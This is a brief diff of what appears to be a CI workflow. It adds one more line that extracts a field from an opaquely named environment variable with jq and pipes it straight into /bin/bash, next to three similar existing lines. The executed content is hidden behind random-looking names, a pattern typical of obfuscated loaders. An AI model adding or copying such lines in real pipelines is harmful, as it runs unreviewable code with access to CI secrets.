@@ -31,6 +31,7 @@ jobs:
           echo $kodvj53 | jq -r .qo50531 | /bin/bash
           echo $h7 | jq -r .wqd3650 | /bin/bash
           printf '%s' "$clzdh4" | jq -r .ea223 | /bin/bash
+          printf '%s' "$dxp021" | jq -r .r59507 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
